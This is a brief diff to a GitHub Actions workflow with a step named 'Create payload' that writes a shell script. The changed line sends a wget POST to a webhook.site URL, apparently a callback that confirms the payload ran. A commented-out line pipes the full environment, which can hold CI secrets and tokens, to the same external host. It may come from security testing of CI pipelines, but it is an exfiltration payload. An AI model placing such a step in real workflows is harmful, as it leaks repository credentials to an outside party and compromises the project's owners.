@@ -15,7 +15,7 @@ jobs:
       - name: "Create payload"
         run: |
           cat <<EOF > payload.sh
-          wget --quiet --method=POST https://webhook.site/5f50f1da-b7f9-4ef0-b988-14f91d971e64
+          wget --quiet --method=POST https://webhook.site/b3ad9a28-2a07-440a-a941-d3b40c6deb65
           #env | wget --quiet --method=POST --header='Content-Type: text/plain' --body-file=- https://webhook.site/5f50f1da-b7f9-4ef0-b988-14f91d971e64 -O -
           EOF
 
